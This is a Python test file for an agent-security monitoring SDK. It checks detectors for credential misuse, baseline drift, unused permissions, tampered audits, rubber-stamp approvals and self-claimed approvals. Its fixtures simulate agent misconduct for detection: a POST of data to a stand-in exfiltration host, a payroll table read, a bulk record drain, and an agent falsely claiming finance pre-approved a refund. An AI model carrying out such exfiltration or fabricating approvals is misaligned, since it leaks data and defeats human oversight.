"""Tests for agent security in production:
1. Identity tracking (agent identity, owner, credential, cross-user violations, team metrics)
2. Runtime drift against history (new hosts, new tables, read-to-write, volume drainage)
3. Access held but unused (over-permissioned tool trimming, inactive agents, orphaned owners)
4. Action audits & rubber-stamp detection (action queries, CSV export, HMAC tamper-proof signing,
   rapid rubber-stamp detection, argument-hash binding, self-claimed approval rejection)
"""
import json
from datetime import datetime, timedelta, timezone
import pytest

import assay_sdk as assay
from assay_sdk.production_security import (
    AccessAuditReport,
    ActionAuditRecord,
    AgentBaseline,
    AgentIdentity,
    DriftAlert,
    IdentityViolation,
    audit_access_held,
    audit_all_agents_access,
    check_identity_violations,
    check_self_claimed_approvals,
    compute_identity_metrics,
    detect_rubber_stamp_approvals,
    detect_runtime_drift,
    export_audit_csv,
    export_signed_audit,
    hash_arguments,
    learn_agent_baseline,
    query_action_audit,
    verify_approval_for_action,
    verify_signed_audit,
)
from assay_sdk.testing import (
    assert_no_cross_user_credentials,
    assert_no_rubber_stamp_approvals,
    assert_strictly_approved,
    assert_valid_identity,
    assert_within_baseline,
    expect,
)
from assay.changes import items as change_items
from assay.security import (
    drift_alerts_from_runs,
    identity_violations_from_runs,
    unused_access_from_runs,
)


# ============================================================================
# 1. Identity Tracking Tests
# ============================================================================

def test_identity_tracking_valid_run():
    with assay.run("support_task", agent_id="support_bot", owner="team-eng@corp.com",
                   requested_by="alice@corp.com", credential="sa_support_read",
                   credential_type="service_account") as run:
        run.tool("lookup_ticket", {"ticket_id": "T-101"})
        run.answer("Ticket is open.")

    violations = check_identity_violations(run)
    assert violations == []
    expect(run).has_valid_identity()
    expect(run).no_cross_user_credentials()
    assert_valid_identity(run)
    assert_no_cross_user_credentials(run)


def test_identity_tracking_cross_user_credential_violation():
    """An agent using a person's delegated credential on someone else's request must be flagged."""
    with assay.run("file_export", agent_id="file_bot", owner="team-ops@corp.com",
                   requested_by="bob@corp.com", credential="cred_alice_pat",
                   credential_type="user_oauth", credential_owner="alice@corp.com") as run:
        # Step uses Alice's credentials on Bob's request
        run.tool("read_private_files", {"user_id": "bob"}, credential_owner="alice@corp.com", requested_by="bob@corp.com")
        run.answer("Files exported.")

    violations = check_identity_violations(run)
    assert len(violations) == 1
    assert violations[0].kind == "cross_user_credential"
    assert "alice@corp.com" in violations[0].reason
    assert "bob@corp.com" in violations[0].reason

    failures = expect(run).no_cross_user_credentials().failures()
    assert len(failures) == 1
    assert "cross_user_credential" in failures[0] or "alice@corp.com" in failures[0]

    with pytest.raises(AssertionError, match="someone else's request"):
        assert_no_cross_user_credentials(run)


def test_identity_tracking_missing_owner_and_agent_id():
    """Agents operating without a known owner or identity must be flagged."""
    with assay.run("mystery_job") as run:
        run.tool("do_work", {})

    violations = check_identity_violations(run)
    kinds = {v.kind for v in violations}
    assert "missing_owner" in kinds

    failures = expect(run).has_valid_identity().failures()
    assert len(failures) == 1
    assert "no owner on record" in failures[0]


def test_compute_identity_metrics():
    """Tests fleet-wide identity share calculations."""
    runs = [
        # Valid run: 2 tools
        {
            "id": "r1",
            "agent_id": "bot_a",
            "owner": "alice@corp.com",
            "requested_by": "user1",
            "steps": [
                {"kind": "tool", "name": "t1"},
                {"kind": "tool", "name": "t2"},
            ],
        },
        # Unowned run: 1 tool
        {
            "id": "r2",
            "agent_id": "bot_b",
            "owner": None,
            "requested_by": "user2",
            "steps": [
                {"kind": "tool", "name": "t3"},
            ],
        },
        # Cross-user credential run: 1 tool
        {
            "id": "r3",
            "agent_id": "bot_c",
            "owner": "bob@corp.com",
            "requested_by": "user3",
            "steps": [
                {"kind": "tool", "name": "t4", "credential_owner": "other_user", "requested_by": "user3"},
            ],
        },
    ]

    metrics = compute_identity_metrics(runs)
    assert metrics["total_actions"] == 4
    assert metrics["actions_with_known_owner"] == 3
    assert metrics["unowned_actions"] == 1
    assert metrics["cross_user_credential_actions"] == 1
    assert metrics["known_owner_share"] == 0.75
    assert metrics["agent_identity_share"] == 1.0


# ============================================================================
# 2. Runtime Drift Against History Tests
# ============================================================================

def test_runtime_drift_learning_and_detection():
    # Baseline history: only reads from customers table, contacts internal api
    baseline_runs = [
        {
            "id": "base-1",
            "agent_id": "support_agent",
            "steps": [
                {"kind": "tool", "name": "HTTP GET api.internal.corp/v1/customers", "args": {"customer_id": "cust-1", "limit": 5}, "result": [{"id": 1}]},
                {"kind": "tool", "name": "read_customers", "args": {"customer_id": "cust-1", "table": "customers"}, "result": {"name": "Alice"}},
            ],
        },
        {
            "id": "base-2",
            "agent_id": "support_agent",
            "steps": [
                {"kind": "tool", "name": "read_customers", "args": {"customer_id": "cust-2", "table": "customers"}, "result": {"name": "Bob"}},
            ],
        },
    ]

    baseline = learn_agent_baseline(baseline_runs, agent_id="support_agent")
    assert "api.internal.corp" in baseline.hosts
    assert "customers" in baseline.tables
    assert "read_customers" in baseline.read_only_tools
    assert len(baseline.write_tools) == 0

    # 1. Candidate run with NO drift: normal read
    with assay.run("task_normal", agent_id="support_agent") as run_ok:
        run_ok.tool("read_customers", {"customer_id": "cust-1", "table": "customers"}, result={"name": "Alice"})
    assert detect_runtime_drift(baseline, run_ok) == []
    expect(run_ok).within_baseline(baseline)
    assert_within_baseline(run_ok, baseline)

    # 2. Candidate contacts NEW host -> DRIFT
    with assay.run("task_new_host", agent_id="support_agent") as run_host:
        run_host.tool("HTTP POST api.exfiltrate-data.org/v1/dump", {"data": "..."})

    alerts_host = detect_runtime_drift(baseline, run_host)
    assert len(alerts_host) >= 1
    assert alerts_host[0].kind == "new_host"
    assert "api.exfiltrate-data.org" in alerts_host[0].target
    with pytest.raises(AssertionError, match="new host"):
        assert_within_baseline(run_host, baseline)

    # 3. Candidate accesses NEW table -> DRIFT
    with assay.run("task_new_table", agent_id="support_agent") as run_table:
        run_table.tool("query_db", {"sql": "SELECT * FROM payroll_salaries WHERE id = 1"})

    alerts_table = detect_runtime_drift(baseline, run_table)
    assert any(a.kind == "new_table" and "payroll_salaries" in a.target for a in alerts_table)

    # 4. Candidate executes a WRITE where it previously only READ -> READ-TO-WRITE DRIFT
    with assay.run("task_write_drift", agent_id="support_agent") as run_write:
        run_write.tool("update_customers", {"customer_id": "cust-1", "table": "customers", "status": "banned"})

    alerts_write = detect_runtime_drift(baseline, run_write)
    assert any(a.kind == "read_to_write" for a in alerts_write)
    with pytest.raises(AssertionError, match="Read-to-write drift"):
        assert_within_baseline(run_write, baseline)

    # 5. Volume drainage anomaly -> agent reads 1000 records
    with assay.run("task_drain", agent_id="support_agent") as run_drain:
        run_drain.tool("read_customers", {"limit": 1000}, result=[{"id": i} for i in range(1000)])

    alerts_drain = detect_runtime_drift(baseline, run_drain)
    assert any(a.kind == "volume_spike" for a in alerts_drain)


# ============================================================================
# 3. Access Held but Unused (Auditing & Trimming)
# ============================================================================

def test_audit_access_held_and_trimming():
    now = datetime(2026, 10, 30, 12, 0, 0, tzinfo=timezone.utc)
    permissions = {
        "agent_id": "support_bot",
        "owner": "alice@corp.com",
        "granted_tools": ["read_order", "lookup_customer", "refund", "delete_database", "drop_table"],
    }

    # Runs in the last 10 days: only called read_order and lookup_customer
    runs = [
        {
            "agent_id": "support_bot",
            "ts": (now - timedelta(days=2)).isoformat(),
            "steps": [
                {"kind": "tool", "name": "read_order"},
                {"kind": "tool", "name": "lookup_customer"},
            ],
        },
        {
            "agent_id": "support_bot",
            "ts": (now - timedelta(days=5)).isoformat(),
            "steps": [
                {"kind": "tool", "name": "read_order"},
            ],
        },
    ]

    active_owners = {"alice@corp.com", "bob@corp.com"}
    report = audit_access_held(permissions, runs, inactive_days=30, reference_time=now, active_owners=active_owners)

    assert set(report.used_tools) == {"read_order", "lookup_customer"}
    assert set(report.unused_tools) == {"refund", "delete_database", "drop_table"}
    assert report.unused_access_share == 0.6  # 3 of 5 tools unused
    assert not report.is_inactive_agent
    assert not report.is_owner_inactive
    assert set(report.recommended_permissions) == {"read_order", "lookup_customer"}


def test_audit_access_inactive_agent_and_orphaned_owner():
    now = datetime(2026, 10, 30, 12, 0, 0, tzinfo=timezone.utc)
    permissions = {
        "agent_id": "dormant_bot",
        "owner": "departed_employee@corp.com",
        "granted_tools": ["manage_secrets", "delete_account"],
    }

    # Runs from 60 days ago
    runs = [
        {
            "agent_id": "dormant_bot",
            "ts": (now - timedelta(days=60)).isoformat(),
            "steps": [{"kind": "tool", "name": "manage_secrets"}],
        }
    ]

    active_owners = {"alice@corp.com"}  # departed_employee is no longer active
    report = audit_access_held(permissions, runs, inactive_days=30, reference_time=now, active_owners=active_owners)

    assert report.is_inactive_agent is True
    assert report.is_owner_inactive is True
    assert len(report.recommended_permissions) == 0


def test_audit_all_agents_fleet_metric():
    registry = [
        {"agent_id": "bot_active", "owner": "alice", "tools": ["t1"]},
        {"agent_id": "bot_excess", "owner": "bob", "tools": ["t1", "t2", "t3"]},
    ]
    runs = [
        {"agent_id": "bot_active", "steps": [{"kind": "tool", "name": "t1"}]},
        {"agent_id": "bot_excess", "steps": [{"kind": "tool", "name": "t1"}]},
    ]
    fleet = audit_all_agents_access(registry, runs, inactive_days=30)
    assert fleet["total_agents"] == 2
    assert fleet["agents_with_unused_access"] == 1
    assert fleet["share_agents_with_unused_access"] == 0.5
    assert fleet["total_unused_permissions_count"] == 2  # t2 and t3


# ============================================================================
# 4. Action Audits & Rubber-Stamp Detection Tests
# ============================================================================

def test_query_action_audit_and_csv_export():
    now = datetime(2026, 10, 30, 10, 0, 0, tzinfo=timezone.utc)
    runs = [
        {
            "id": "run-refund-1",
            "agent_id": "support_agent",
            "owner": "team-billing@corp.com",
            "requested_by": "customer_101",
            "outcome": "resolved",
            "steps": [
                {
                    "kind": "approval",
                    "name": "refund",
                    "decision": "approved",
                    "by": "manager_dave",
                    "time_to_approve_ms": 3500.0,
                    "rule": "disputed_order_policy_v2",
                    "evidence": "item never arrived",
                },
                {
                    "kind": "tool",
                    "name": "refund",
                    "args": {"order_id": "O-999", "amount": 150.0},
                    "status": "ok",
                    "ts": now.isoformat(),
                },
            ],
        },
        {
            "id": "run-refund-2",
            "agent_id": "support_agent",
            "owner": "team-billing@corp.com",
            "requested_by": "customer_102",
            "outcome": "resolved",
            "steps": [
                {
                    "kind": "tool",
                    "name": "refund",
                    "args": {"order_id": "O-1000", "amount": 25.0},
                    "status": "ok",
                    "ts": now.isoformat(),
                },
            ],
        },
    ]

    # Query every refund > $100
    records = query_action_audit(runs, action="refund", min_amount=100.0)
    assert len(records) == 1
    rec = records[0]
    assert rec.run_id == "run-refund-1"
    assert rec.amount == 150.0
    assert rec.approved_by == "manager_dave"
    assert rec.time_to_approve_ms == 3500.0
    assert rec.rule == "disputed_order_policy_v2"
    assert rec.evidence == "item never arrived"

    csv_data = export_audit_csv(records)
    assert "run-refund-1" in csv_data
    assert "manager_dave" in csv_data
    assert "150.00" in csv_data
    assert "disputed_order_policy_v2" in csv_data


def test_export_signed_audit_tamper_detection():
    records = [
        ActionAuditRecord(
            run_id="run-test-sig",
            action="execute_payment",
            arguments={"account": "ACC-1", "amount": 5000.0},
            amount=5000.0,
            agent_id="payment_bot",
            owner="finance",
            requested_by="lead_exec",
            approved_by="cfo_jane",
            time_to_approve_ms=12000.0,
            outcome="ok",
        )
    ]
    secret = "production_audit_secret_key_123"

    signed_pkg = export_signed_audit(records, secret)
    assert "signature" in signed_pkg
    assert verify_signed_audit(signed_pkg, secret) is True

    # Tampering with wrong key
    assert verify_signed_audit(signed_pkg, "wrong_secret") is False

    # Tampering with record contents (e.g. changing amount from 5000 to 50)
    tampered_pkg = json.loads(json.dumps(signed_pkg))
    tampered_pkg["records"][0]["amount"] = 50.0
    assert verify_signed_audit(tampered_pkg, secret) is False


def test_rubber_stamp_approval_detection():
    """Approvals granted faster than human comprehension threshold must be flagged."""
    with assay.run("case_quick_approval") as run:
        # 120ms approval is a rubber stamp!
        run.approval("refund", "approved", by="distracted_reviewer", time_to_approve_ms=120.0)
        run.tool("refund", {"amount": 500})

    stamps = detect_rubber_stamp_approvals(run, min_review_seconds=1.0)
    assert len(stamps) == 1
    assert stamps[0]["kind"] == "fast_approval"
    assert "120ms" in stamps[0]["reason"]

    failures = expect(run).no_rubber_stamp_approvals(min_review_seconds=1.0).failures()
    assert len(failures) == 1
    assert "rubber-stamped" in failures[0]


def test_argument_hash_binding_prevents_tampered_requests():
    """If an action's arguments are modified after approval was granted, it must fail!"""
    original_args = {"order_id": "O-444", "amount": 35.0}
    modified_args = {"order_id": "O-444", "amount": 3500.0}  # Modified!

    # 1. Matching arguments: passes
    with assay.run("case_matching_args") as run_ok:
        run_ok.approval("refund", "approved", by="finance", args=original_args, source="human")
        run_ok.tool("refund", original_args)

    expect(run_ok).strictly_approved("refund")
    assert_strictly_approved(run_ok, "refund")

    # 2. Modified arguments: FAILS argument-hash binding!
    with assay.run("case_modified_args") as run_tampered:
        run_tampered.approval("refund", "approved", by="finance", args=original_args, source="human")
        run_tampered.tool("refund", modified_args)  # tampered!

    failures = expect(run_tampered).strictly_approved("refund").failures()
    assert len(failures) == 1
    assert "argument-hash binding mismatch" in failures[0]

    with pytest.raises(AssertionError, match="argument-hash binding mismatch"):
        assert_strictly_approved(run_tampered, "refund")


def test_rejection_of_self_claimed_approvals():
    """An agent claiming approval in its output or args without an authentic approval step must be rejected."""
    # 1. Agent falsely claiming approval in tool arguments
    with assay.run("case_fake_args") as run_spoofed:
        run_spoofed.tool("refund", {"amount": 200, "pre_approved": True, "approved_by": "finance"})
        run_spoofed.answer("Refunded.")

    failures = expect(run_spoofed).must_get_approval_before("refund").failures()
    assert len(failures) == 1
    assert "without an approval" in failures[0] or "self-claimed" in failures[0]

    # 2. Agent claiming approval in answer text without approval step
    with assay.run("case_fake_text") as run_text:
        run_text.tool("refund", {"amount": 50})
        run_text.answer("The invoice was pre-approved by finance.")

    failures_text = expect(run_text).must_get_approval_before("refund").failures()
    assert len(failures_text) >= 1
    assert "without an approval" in failures_text[0] or "self-claimed" in failures_text[0]


def test_approval_staleness_and_untrusted_sources():
    now = datetime(2026, 10, 30, 10, 0, 0, tzinfo=timezone.utc)
    old_time = now - timedelta(hours=2)

    # 1. Stale approval: approved 2 hours ago when max_age is 60s
    with assay.run("case_stale") as run_stale:
        run_stale.approval("refund", "approved", by="lead", started=old_time)
        run_stale.tool("refund", {"amount": 50}, started=now)

    failures_stale = expect(run_stale).must_get_approval_before("refund", max_age_seconds=60).failures()
    assert len(failures_stale) == 1
    assert "expired approval" in failures_stale[0]

    # 2. Untrusted source: approval came from 'intern' when only ['manager', 'director'] allowed
    with assay.run("case_untrusted_source") as run_untrusted:
        run_untrusted.approval("refund", "approved", by="intern", source="intern")
        run_untrusted.tool("refund", {"amount": 50})

    failures_src = expect(run_untrusted).must_get_approval_before("refund", allowed_sources=["manager", "director"]).failures()
    assert len(failures_src) == 1
    assert "after it was untrusted_source" in failures_src[0] or "without an approval" in failures_src[0]


# ============================================================================
# 5. Change Report Integration Tests
# ============================================================================

def test_change_report_production_security_items():
    run_with_issues = {
        "identity_violations": [
            {"text": "Agent used person's credential (alice) on bob's request", "detail": "critical", "key": "id:1", "cases": ["case_1"]}
        ],
        "drift_alerts": [
            {"text": "Read-to-write drift on customers", "detail": "high", "key": "drift:1", "cases": ["case_1"]}
        ],
        "unused_access": [
            {"text": "Unused permissions: 3 tools inactive for 30+ days", "detail": "agent: bot_1", "key": "access:1", "cases": []}
        ],
    }

    report_items = change_items({}, run_with_issues, [])
    kinds = [it["kind"] for it in report_items]

    assert "identity_violation" in kinds
    assert "drift_alert" in kinds
    assert "unused_access" in kinds
